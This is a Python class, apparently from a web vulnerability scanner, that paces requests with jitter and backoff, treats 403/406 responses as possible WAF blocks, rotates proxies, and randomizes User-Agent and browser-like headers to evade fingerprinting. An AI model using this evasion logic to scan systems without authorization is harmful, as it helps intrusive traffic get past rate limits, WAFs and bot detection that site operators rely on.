class RateController:
    """
    Adaptive rate limiting with:
      - Jitter: uniform random ± configurable percentage around base delay
      - Exponential backoff on 429/503/WAF-block responses
      - Proxy rotation (round-robin through a proxy list)
      - User-Agent and header rotation per request
      - Session-sticky UA (same UA within a logical session, rotated across sessions)

    Usage:
        rc = RateController(
            base_delay=0.5,
            jitter_pct=0.3,
            proxy_list=["socks5://proxy1:1080", "http://proxy2:8080"],
        )

        # Before each request:
        rc.pre_request_delay()
        headers = rc.get_rotated_headers()
        proxies = rc.get_next_proxy()

        # After each response:
        rc.observe_response(response)  # adjusts delay on 429/503
    """

    def __init__(
        self,
        base_delay: float = 0.3,
        jitter_pct: float = 0.3,
        proxy_list: Optional[List[str]] = None,
        max_backoff: float = 60.0,
        session_sticky_ua: bool = True,
    ):
        self.base_delay = base_delay
        self.jitter_pct = jitter_pct
        self.proxy_list = proxy_list or []
        self.max_backoff = max_backoff
        self.session_sticky_ua = session_sticky_ua

        self._current_delay = base_delay
        self._backoff_multiplier = 1.0
        self._consecutive_blocks = 0
        self._proxy_index = 0
        self._lock = threading.Lock()

        # Pick a session UA for sticky mode
        self._session_ua = random.choice(USER_AGENT_POOL)
        self._session_accept_lang = random.choice(ACCEPT_LANGUAGE_POOL)

    def pre_request_delay(self) -> float:
        """Sleep with jitter before making a request. Returns actual delay used."""
        delay = self._current_delay * self._backoff_multiplier
        jitter = delay * self.jitter_pct
        actual = max(0, delay + random.uniform(-jitter, jitter))
        if actual > 0:
            _time.sleep(actual)
        return actual

    def observe_response(self, response) -> None:
        """Adjust rate based on response status code.

        429 (Too Many Requests) → exponential backoff
        503 (Service Unavailable) → moderate backoff
        403 after canary → possible WAF block, slight increase
        200 → decay backoff toward baseline
        """
        if response is None:
            return

        status = response.status_code

        with self._lock:
            if status == 429:
                self._consecutive_blocks += 1
                self._backoff_multiplier = min(
                    self._backoff_multiplier * 2.0,
                    self.max_backoff / max(self.base_delay, 0.01),
                )
                retry_after = response.headers.get("Retry-After")
                if retry_after:
                    try:
                        self._current_delay = max(self._current_delay, float(retry_after))
                    except ValueError:
                        pass

            elif status == 503:
                self._consecutive_blocks += 1
                self._backoff_multiplier = min(
                    self._backoff_multiplier * 1.5,
                    self.max_backoff / max(self.base_delay, 0.01),
                )

            elif status in (403, 406):
                self._consecutive_blocks += 1
                self._backoff_multiplier = min(
                    self._backoff_multiplier * 1.2,
                    self.max_backoff / max(self.base_delay, 0.01),
                )

            elif 200 <= status < 400:
                # Decay backoff on successful responses
                self._consecutive_blocks = max(0, self._consecutive_blocks - 1)
                self._backoff_multiplier = max(1.0, self._backoff_multiplier * 0.8)

    def get_rotated_headers(self) -> Dict[str, str]:
        """Return a set of headers that mimic a real browser.
        Header ordering varies to defeat ordering-based fingerprinting."""
        if self.session_sticky_ua:
            ua = self._session_ua
            lang = self._session_accept_lang
        else:
            ua = random.choice(USER_AGENT_POOL)
            lang = random.choice(ACCEPT_LANGUAGE_POOL)

        headers = {
            "User-Agent": ua,
            "Accept": random.choice(ACCEPT_POOL),
            "Accept-Language": lang,
            "Accept-Encoding": random.choice(ACCEPT_ENCODING_POOL),
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }

        # Randomly add optional browser-like headers
        if random.random() > 0.5:
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
            headers["Sec-Fetch-Dest"] = "document"
            headers["Sec-Fetch-User"] = "?1"

        if random.random() > 0.7:
            headers["Cache-Control"] = random.choice(["no-cache", "max-age=0"])

        if random.random() > 0.6:
            headers["DNT"] = "1"

        return headers

    def get_next_proxy(self) -> Optional[Dict[str, str]]:
        """Round-robin through proxy list. Returns requests-compatible proxy dict."""
        if not self.proxy_list:
            return None
        with self._lock:
            proxy_url = self.proxy_list[self._proxy_index % len(self.proxy_list)]
            self._proxy_index += 1
        if proxy_url.startswith("socks"):
            return {"http": proxy_url, "https": proxy_url}
        return {"http": proxy_url, "https": proxy_url}

    def rotate_session(self) -> None:
        """Force rotation of session-sticky UA and language.
        Call this when switching to a different scanning phase."""
        self._session_ua = random.choice(USER_AGENT_POOL)
        self._session_accept_lang = random.choice(ACCEPT_LANGUAGE_POOL)

    @property
    def is_being_throttled(self) -> bool:
        return self._consecutive_blocks >= 3

    @property
    def effective_delay(self) -> float:
        return self._current_delay * self._backoff_multiplier

    def reset(self) -> None:
        """Reset all backoff state."""
        with self._lock:
            self._current_delay = self.base_delay
            self._backoff_multiplier = 1.0
            self._consecutive_blocks = 0


